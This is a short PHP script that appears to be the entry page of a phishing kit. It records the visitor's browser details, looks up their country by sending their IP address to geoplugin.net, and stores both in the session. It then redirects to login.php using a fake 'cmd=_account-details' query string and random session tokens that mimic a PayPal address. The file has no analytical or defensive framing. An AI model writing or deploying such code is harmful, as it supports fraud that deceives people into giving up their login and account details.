<?php
session_start();
include("send/browser.php");
$bro = getBrowser();
$getbro = $bro["name"]." ".$bro["version"]." on ".$bro["platform"];
$_SESSION["bro"] = $getbro;
/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country
$countryforip = "$COUNTRY"; 
$_SESSION["COUNTRY"] = "$countryforip";
$x=md5(microtime());$xx=sha1(microtime());
header("location:login.php?cmd=_account-details&session=".$x.$xx."");

?>